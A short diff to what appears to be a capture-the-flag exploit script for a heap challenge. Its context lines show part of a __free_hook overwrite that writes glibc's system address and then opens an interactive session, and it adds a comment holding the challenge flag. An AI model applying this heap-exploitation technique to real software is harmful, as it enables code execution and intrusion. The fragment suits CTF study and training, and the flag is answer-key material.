@@ -86,3 +86,5 @@ add(p32(glibc.symbols.system) * 2 + "\n", size: (heap - glibc.symbols.__free_hoo
 del(2)
 
 z.interact
+
+# CBCTF{This problem comes from DEFCON 2014 nonameyet. Did you notice that?}
